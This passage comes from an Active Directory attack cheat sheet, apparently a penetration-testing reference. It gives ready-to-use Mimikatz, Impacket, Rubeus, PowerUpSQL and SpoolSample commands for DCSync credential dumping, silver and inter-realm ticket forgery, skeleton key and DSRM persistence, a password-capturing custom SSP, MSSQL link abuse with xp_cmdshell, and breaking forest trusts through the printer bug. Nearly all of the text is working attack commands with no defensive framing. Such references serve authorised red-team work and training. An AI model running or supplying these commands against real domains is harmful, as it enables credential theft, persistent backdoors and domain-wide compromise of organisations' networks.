Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'
```

```bash
# DCSync via Impacket secretsdump (NTLM auth)
impacket-secretsdump <Domain>/<Username>:<Password>@<DC IP or FQDN> -just-dc-ntlm

# DCSync via Impacket secretsdump (Kerberos auth)
impacket-secretsdump -no-pass -k <Domain>/<Username>@<DC IP or FQDN> -just-dc-ntlm
```

> **Tip —** `/ptt` injects the ticket into the current session; `/ticket` saves it to disk for later use.

### Silver Ticket Attack

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TargetMachine> /service:<ServiceType> /rc4:<SPN Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
```

SPN list reference: adsecurity.org.

### Skeleton Key Attack

```powershell
# Run as DA
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC FQDN>

# Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachine> -Credential <Domain>\Administrator
```

### DSRM Abuse

Every DC has a local Administrator with the DSRM (SafeBackup) password. Dump and PTH its NTLM hash for local Administrator access to the DC.

```powershell
# Dump DSRM password (needs DA)
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC'sName>

# Alter DSRM logon behaviour before PTH — connect to the DC
Enter-PSSession -ComputerName <DC'sName>

# Set the logon behaviour in the registry
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

# If the property already exists
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
```

Then PTH for local admin access on the DC.

### Custom SSP

Drop a custom SSP (e.g. mimilib.dll) to capture plaintext passwords of users who log on.

```powershell
# Get current Security Package
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty 'Security Packages'

# Append mimilib
$packages += "mimilib"

# Set the new packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages

# ALTERNATIVE
Invoke-Mimikatz -Command '"misc::memssp"'
```

DC logons are logged to `C:\Windows\System32\kiwissp.log`.

## Cross-Forest Attacks

### Trust Tickets

With Domain Admin rights on a domain that has a bidirectional trust with another forest, get the trust key and forge an inter-realm TGT. Access is limited to what your DA account is configured for on the other forest.

- Using Mimikatz:

  ```powershell
  # Dump the trust key
  Invoke-Mimikatz -Command '"lsadump::trust /patch"'
  Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  # Forge an inter-realm TGT (golden ticket)
  Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TargetDomain> /ticket:<PathToSaveTicket>"'
  ```

  Tickets are `.kirbi` format. Then ask for a TGS to the external forest for any service using the inter-realm TGT.

- Using Rubeus:

  ```powershell
  .\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service SPN" /ptt
  ```

### Abuse MSSQL Servers

- Enumerate MSSQL instances: `Get-SQLInstanceDomain`
- Check accessibility as current user:

  ```powershell
  Get-SQLConnectionTestThreaded
  Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
  ```

- Gather instance info: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
- Abuse SQL database links (a database link lets one SQL Server access another; stored procedures execute across the link — even across forest trusts):

  ```powershell
  # Check for existing database links (PowerUpSQL)
  Get-SQLServerLink -Instance <SPN> -Verbose

  # MSSQL query
  select * from master..sysservers
  ```

  Enumerate other links from the linked database:

  ```sql
  -- Manually
  select * from openquery("LinkedDatabase", 'select * from master..sysservers')
  ```

  ```powershell
  # PowerUpSQL — enumerate every link across forests/child domains
  Get-SQLServerLinkCrawl -Instance <SPN> -Verbose
  ```

  ```sql
  -- Enable RPC Out (required to execute xp_cmdshell)
  EXEC sp_serveroption 'sqllinked-hostname', 'rpc', 'true';
  EXEC sp_serveroption 'sqllinked-hostname', 'rpc out', 'true';
  select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc'',''true'';');
  select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc out'',''true'';');

  -- Enable xp_cmdshell if disabled, then execute
  EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
  ```

  Query execution:

  ```powershell
  Get-SQLServerLinkCrawl -Instance <SPN> -Query "exec master..xp_cmdshell 'whoami'"
  ```

### Breaking Forest Trusts

With a bidirectional trust to an external forest, compromise a machine in the local forest that has unconstrained delegation (DCs do by default). Use the printer bug to coerce the external forest root DC to authenticate to you, capture its TGT, inject it, and DCSync the whole forest.

```powershell
# Start monitoring for TGTs with rubeus
Rubeus.exe monitor /interval:5 /filteruser:target-dc

# Trigger forced authentication of the target DC (printer bug)
SpoolSample.exe target-dc.external.forest.local dc.compromised.domain.local

# Inject the base64 captured TGT
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

# Dump the hashes of the target domain
lsadump::dcsync /domain:external.forest.local /all
```

Detailed reading: harmj0y "Not A Security Boundary: Breaking Forest Trusts"; SpecterOps "Hunting in Active Directory: Unconstrained Delegation & Forests Trusts".
